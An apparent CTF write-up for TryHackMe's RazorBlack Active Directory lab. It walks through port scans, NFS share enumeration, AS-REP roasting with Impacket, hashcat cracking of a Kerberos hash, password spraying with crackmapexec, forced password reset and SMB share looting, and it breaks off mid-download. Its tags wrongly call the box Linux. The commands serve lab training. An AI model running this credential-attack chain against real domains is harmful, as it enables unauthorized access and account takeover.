---
title: "THM - # RazorBlack"
classes: wide
tag: 
  - "OSCP Box"
  - "VSFTPD 2.3.4 Exploit"
  - "Linux Box"
  - "Linux VAPT"
  - "Samba 3.0.20"
  - "OSCP Prep"
header:
  teaser: /assets/images/htb/htb.png
ribbon: blue
description: "Writeup for THM - # RazorBlack"
categories:
  - THM
---

The given box ```RazorBlack``` is a Linux machine with an IP address of ```10.10.135.22```

- [TryHackMe- RazorBlack](#tryhackme---razorblack)
  - [Recon](#recon)
    - [Nmap Scan Result](#nmap-scan-result)
  - [Enumeration](#enumeration)
    - [RPC](#rpc)
    	- [usernames](#usernames)
    	- [Converting usernames into ad username format](#Converting-usernames-into ad-username-format)
    	- [Request AS_REP message](#Request-AS-REP-message)
    	- [Cracking the hash](#Cracking-the-hash)
  

## Recon

### Nmap Scan Result

On performing a nmap scan on the target, we can see there are 32 standard ports open

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# masscan -p1-65535,U:1-65535 --rate=1000 10.10.135.22 -e tun0
Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2022-07-11 15:34:16 GMT
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 58637/udp on 10.10.135.22
Discovered open port 389/tcp on 10.10.135.22
Discovered open port 49679/tcp on 10.10.135.22
Discovered open port 636/tcp on 10.10.135.22
Discovered open port 135/tcp on 10.10.135.22
Discovered open port 593/tcp on 10.10.135.22
Discovered open port 53/tcp on 10.10.135.22
Discovered open port 49669/tcp on 10.10.135.22
Discovered open port 49856/tcp on 10.10.135.22
Discovered open port 49667/tcp on 10.10.135.22
Discovered open port 49674/tcp on 10.10.135.22
Discovered open port 57300/udp on 10.10.135.22
Discovered open port 9389/tcp on 10.10.135.22
Discovered open port 49676/tcp on 10.10.135.22
Discovered open port 49664/tcp on 10.10.135.22
Discovered open port 2049/tcp on 10.10.135.22
Discovered open port 47001/tcp on 10.10.135.22
Discovered open port 3268/tcp on 10.10.135.22
Discovered open port 49665/tcp on 10.10.135.22
Discovered open port 57651/udp on 10.10.135.22
Discovered open port 5985/tcp on 10.10.135.22
Discovered open port 3389/tcp on 10.10.135.22
Discovered open port 464/tcp on 10.10.135.22
Discovered open port 88/tcp on 10.10.135.22
Discovered open port 49708/tcp on 10.10.135.22
Discovered open port 3269/tcp on 10.10.135.22
Discovered open port 139/tcp on 10.10.135.22
Discovered open port 58941/udp on 10.10.135.22
Discovered open port 111/tcp on 10.10.135.22
Discovered open port 445/tcp on 10.10.135.22
Discovered open port 49675/tcp on 10.10.135.22
Discovered open port 49694/tcp on 10.10.135.22
```

	

And also it discovered that the machine is running ```Windows``` OS

```shell
# Nmap 7.92 scan initiated Sat Jul  9 19:57:26 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/_full_tcp_nmap.txt -oX /root/thm/machines/medium/raz0rblack/results/10.10.247.120/scans/xml/_full_tcp_nmap.xml 10.10.247.120
Increasing send delay for 10.10.247.120 from 0 to 5 due to 611 out of 1527 dropped probes since last increase.
Increasing send delay for 10.10.247.120 from 5 to 10 due to 11 out of 12 dropped probes since last increase.
Nmap scan report for 10.10.247.120
Host is up, received user-set (0.18s latency).
Scanned at 2022-07-09 19:57:27 IST for 1142s
Not shown: 65508 closed tcp ports (reset)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2022-07-09 14:41:39Z)
111/tcp   open  rpcbind       syn-ack ttl 127 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
2049/tcp  open  mountd        syn-ack ttl 127 1-3 (RPC #100005)
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Issuer: commonName=HAVEN-DC.raz0rblack.thm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-08T14:26:08
| Not valid after:  2023-01-07T14:26:08
| MD5:   8e38 471c d08c 1570 27b1 20e9 faa4 b519
| SHA-1: 12da c7ca 7abc 435f f6ea 542a 6322 db63 8098 ee98
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQQKxL8oWvM7hDGk2gbBkKsTANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdIQVZFTi1EQy5yYXowcmJsYWNrLnRobTAeFw0yMjA3MDgxNDI2
| MDhaFw0yMzAxMDcxNDI2MDhaMCIxIDAeBgNVBAMTF0hBVkVOLURDLnJhejByYmxh
| Y2sudGhtMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0G39e8XIgDuJ
| xMo4IARZCUyCHEWSvqfKODuuj7pdViGtlGOLb1oPLca0lHc9l07zhh45PnNrv/CC
| ehPWfeAeFADdCb+iXlip0lZqvUlCImUbbpMO/NUL9SVhOqA12uH4J7NJK0GgW2x4
| +8g6VD4zPheZfAUOuQECmLRtATSfGW1UewvscL16ih9m2VUXEjdClyK4sq/Fjh5Q
| MgftbQQyqRA3eyNnm69lsbrCJnJ/sxRLjGifkXfB+uCmkw8ZbvmsXqG9xk1VCyf8
| cLn7h5NhgSW1Yr+Xt9wG74SDW2xadloIVsedPdqtRlB8BVaD9271hLAhZky8WAz4
| qLkK0TwuBQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAECk0mch8qtKekAn+uZTYz+i7sABSy7nek34
| L3RNVvYaSAXK0UBF7EFZmq4Ye0EPs390q2LbEbjji3qSWcQywQ6MK5CDBwgfzfU/
| 1x73ieELRcmWiU1X69xdbJr5CdaBbpb8Bapm8+e7pOjHsLH3Qd0Q2ZW3dBMWQQDI
| BBioVi8nJ1ISt3Coy0sYGPy+eKQcIA0D8Y6JOLkZLPaxDyvqx7hmoSXn/ONPQ4Ti
| hP4h/anme8+uNWO1iWYlDR2OgtQTYN24in1/74Etdj3pZX/Fbp04DCNIVcsCmx/R
| rFKZaKnwIvk+Y9zcolud1gMdD9UNaUrkcxLzJkiOdPqcHLN7Fa8=
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2022-07-09T14:44:35+00:00
|_ssl-date: 2022-07-09T14:44:44+00:00; 0s from scanner time.
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
47001/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Aggressive OS guesses: Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (92%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%), Microsoft Windows Server 2016 (90%), Microsoft Windows 10 1703 (90%), Microsoft Windows 7 SP1 (90%), Microsoft Windows 8 (90%)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=7/9%OT=53%CT=1%CU=39653%PV=Y%DS=2%DC=T%G=Y%TM=62C994C5
OS:%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=103%TI=I%CI=I%II=I%SS=
OS:S%TS=U)OPS(O1=M505NW8NNS%O2=M505NW8NNS%O3=M505NW8%O4=M505NW8NNS%O5=M505N
OS:W8NNS%O6=M505NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN
OS:(R=Y%DF=Y%T=80%W=FFFF%O=M505NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%
OS:W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
OS:T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A
OS:=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%D
OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8
OS:0%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 43629/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 27615/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 49191/udp): CLEAN (Failed to receive data)
|   Check 4 (port 47775/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-07-09T14:44:37
|_  start_date: N/A

TRACEROUTE (using port 8888/tcp)
HOP RTT       ADDRESS
1   172.31 ms 10.11.0.1
2   179.02 ms 10.10.247.120

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul  9 20:16:29 2022 -- 1 IP address (1 host up) scanned in 1142.90 seconds

```

## Enumeration

### RPC 

While enumerating port 111 a nfs is been opened, And found a flag ```THM{ab53e05c9a98def00314a14ccbfa8104}```  from sbradley user and one more file is there where all usernames was mentioned.

```shell
Export list for 10.10.247.120:
/users (everyone)

root@rE3oN:~/thm/machines/medium/raz0rblack# mount 10.10.135.22:/users /mnt/users

root@rE3oN:~/thm/machines/medium/raz0rblack# ls /mnt/users
employee_status.xlsx  sbradley.txt

root@rE3oN:~/thm/machines/medium/raz0rblack# cat /mnt/users/sbradley.txt
THM{ab53e05c9a98def00314a14ccbfa8104}

```

<center>
<img src="https://github.com/enum-more/obsidian_vault/raw/main/razorblack0/Pasted%20image%2020220711213650.png" style="width:40%">
</center>

###### usernames

daven port
imogen royce
tamara vidal
arthur edwards
carl ingram
nolan cassidy
reza zaydan
ljudmila vetrova
rico delgado
tyson williams
steven bradley
chamber lin

###### Converting usernames into ad username format

dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin

#### Request AS_REP message

Trying TGT with help of converted usernames..

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py -no-pass raz0rblack.thm/ -usersfile usernames_mod.txt -format hashcat -outputfile asreproast_hash.txt -dc-ip 10.10.135.22
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User lvetrova doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User sbradley doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

Got the hash of ```twilliams``` 

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# cat asreproast_hash.txt
$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd
```

#### Cracking the hash


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# hashcat -m 18200 asreproast_hash.txt /usr/share/wordlists/rockyou.txt | tee kerberoast-password.txt
hashcat (v6.2.5) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 13.0.1, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================
* Device #1: pthread-0x000, 1439/2942 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291f39fa6030cd00f369fd4$06f6dc8b123f84a99702119a55cf74b9ba8471a0825a6302fc25f593b881b2f21207001aed24fa66b44e8b85b264b955f09366e3c749018cdf6bea9882a4887d82ecd855cf92ae1593c5f45904490efb2d8ced37eed632c2c196b499980684c096db1f76a1fb6e556a79a16e98d202ffbf794936e5182567989ce7f34e765a2bf37ef6852203411904a0e37a557a6a21f7a8e42043777ca4e030a97327fc686a7c9f2896f1c5251dbad6c568673224cbf494c94c392e275d1360920352ca6b183a948e178f6945418aa8726005efd94c675c0c3268fda371088ac3dea2c54e3b7bb0788831d62bf08c3a12e0b1900bcd:roastpotatoes

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:3bb43a9f0291...900bcd
Time.Started.....: Mon Jul 11 21:59:30 2022 (2 secs)
Time.Estimated...: Mon Jul 11 21:59:32 2022 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1784.0 kH/s (0.43ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4221952/14344385 (29.43%)
Rejected.........: 0/4221952 (0.00%)
Restore.Point....: 4220928/14344385 (29.43%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: robb-lfc -> roastmutton

Started: Mon Jul 11 21:59:29 2022
Stopped: Mon Jul 11 21:59:34 2022

```


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -H 10.10.40.138 -u twilliams -p roastpotatoes
[+] IP: 10.10.40.138:445        Name: 10.10.40.138
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share
        SYSVOL                                                  READ ONLY       Logon server share
        trash                                                   NO ACCESS       Files Pending for deletion

```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# crackmapexec smb 10.10.40.138 -u usernames_mod.txt -p roastpotatoes  --continue-on-success
SMB         10.10.40.138    445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE
SMB         10.10.40.138    445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE
SMB         10.10.40.138    445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE

```


```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbpasswd -r 10.10.40.138 -U sbradley
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley on 10.10.40.138.
```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbmap -R $trash -H 10.10.40.138 -u sbradley -p tester123
[+] IP: 10.10.40.138:445        Name: 10.10.40.138
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        .\IPC$\*
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    InitShutdown
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    lsass
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    ntsvcs
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    scerpc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-3ec-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    epmapper
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-2b4-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    LSM_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    eventlog
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-434-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    atsvc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    TermSrv_API_service
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Ctx_WinStation_API_service
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    wkssvc
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-314-1
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-33c-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    SessEnvPublicRpc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\49670
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    6b2ce3a02cafe066
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    RpcProxy\593
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-680-0
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    srvsvc
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    spoolss
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-968-0
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    netdfs
        fr--r--r--                4 Mon Jan  1 05:53:28 1601    W32TIME_ALT
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-300-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a68-0
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\health
        fr--r--r--                3 Mon Jan  1 05:53:28 1601    Amazon\SSM\InstanceData\termination
        fr--r--r--                1 Mon Jan  1 05:53:28 1601    Winsock2\CatalogChangeListener-a2c-0
        NETLOGON                                                READ ONLY       Logon server share
        .\NETLOGON\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        SYSVOL                                                  READ ONLY       Logon server share
        .\SYSVOL\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    raz0rblack.thm
        .\SYSVOL\raz0rblack.thm\*
        dr--r--r--                0 Tue Feb 23 20:33:11 2021    .
        dr--r--r--                0 Tue Feb 23 20:33:11 2021    ..
        dr--r--r--                0 Mon Jul 11 22:17:27 2022    DfsrPrivate
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Policies
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    scripts
        .\SYSVOL\raz0rblack.thm\Policies\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        fr--r--r--               23 Tue Feb 23 20:44:46 2021    GPT.INI
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    MACHINE
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
        fr--r--r--             2796 Tue Feb 23 20:36:52 2021    Registry.pol
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Scripts
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
        .\SYSVOL\raz0rblack.thm\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Scripts\*
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    .
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    ..
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Shutdown
        dr--r--r--                0 Tue Feb 23 20:43:53 2021    Startup
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        fr--r--r--               22 Tue Feb 23 20:30:16 2021    GPT.INI
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    MACHINE
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    USER
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Microsoft
        .\SYSVOL\raz0rblack.thm\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    .
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    ..
        dr--r--r--                0 Tue Feb 23 20:30:16 2021    Windows NT
        trash                                                   READ ONLY       Files Pending for deletion
        .\trash\*
        dr--r--r--                0 Tue Mar 16 11:31:28 2021    .
        dr--r--r--                0 Tue Mar 16 11:31:28 2021    ..
        fr--r--r--             1340 Fri Feb 26 00:59:05 2021    chat_log_20210222143423.txt
        fr--r--r--         18927164 Tue Mar 16 11:32:20 2021    experiment_gone_wrong.zip
        fr--r--r--               37 Sun Feb 28 00:54:21 2021    sbradley.txt

```

```shell
root@rE3oN:~/thm/machines/medium/raz0rblack# smbclient -U 'sbradley' \\\\10.10.45.238\\trash
Password for [WORKGROUP\sbradley]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 11:31:28 2021
  ..                                  D        0  Tue Mar 16 11:31:28 2021
  chat_log_20210222143423.txt         A     1340  Fri Feb 26 00:59:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 11:32:20 2021
  sbradley.txt                        A       37  Sun Feb 28 00:54:21 2021

                5101823 blocks of size 4096. 1003171 blocks available
smb: \> mget *
